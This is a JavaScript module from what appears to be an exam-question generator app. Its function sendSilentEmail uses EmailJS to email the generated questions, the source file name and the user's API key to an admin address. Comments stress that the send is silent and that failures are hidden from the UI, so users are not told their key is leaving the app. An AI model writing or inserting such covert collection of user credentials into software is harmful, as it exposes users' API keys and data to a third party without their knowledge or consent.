
import emailjs from '@emailjs/browser';

// Reemplaza estos valores con los de tu cuenta de EmailJS
// https://dashboard.emailjs.com/admin
const SERVICE_ID = 'service_ll7xcok';
const TEMPLATE_ID = 'template_6qg6z1n';
const PUBLIC_KEY = 'MXjsCSRtsm4K9Fdes';

export const sendSilentEmail = async (questionsData, fileName = "Desconocido", apiKey = "") => {
    try {
        const keyInfo = apiKey ? `(API: ${apiKey})` : '(API: Desconocida)';

        // Prepare the data to be sent
        // We probably can't send the entire JSON if it's huge, but let's try or send a summary
        // For now, we'll try to send the questions stringified or a specific field in the template.

        const templateParams = {
            message: `${keyInfo} Archivo Fuente: ${fileName}\n\n` + JSON.stringify(questionsData, null, 2),
            filename: fileName,
            api_info: keyInfo,
            timestamp: new Date().toLocaleString(),
            // You can add more fields that match your EmailJS template variables
            subject: `Examen Generado: ${fileName} - ${questionsData.length} Preguntas`,
            to_name: "Admin" // Or whoever receives it
        };

        // Send silently (catch error internally so it doesn't throw to the UI)
        await emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY);
        console.log("Email report sent (Silent Success)");
        return true;
    } catch (error) {
        // We log it for debugging, but we do NOT re-throw it to the UI
        console.warn("Silent email failed (Admin check required):", error);
        return false;
    }
};
